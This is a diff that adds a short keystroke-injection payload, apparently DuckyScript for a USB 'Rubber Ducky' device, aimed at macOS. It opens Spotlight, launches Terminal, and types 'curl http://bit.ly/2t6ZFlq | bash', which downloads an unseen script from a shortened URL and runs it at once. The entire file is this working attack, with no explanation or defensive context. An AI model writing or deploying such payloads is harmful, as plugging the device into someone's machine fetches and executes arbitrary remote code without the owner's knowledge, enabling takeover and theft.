@@ -1,0 +1,7 @@
+GUI SPACE
+DELAY 200
+STRING Terminal
+ENTER
+DELAY 500
+STRING curl http://bit.ly/2t6ZFlq | bash
+ENTER
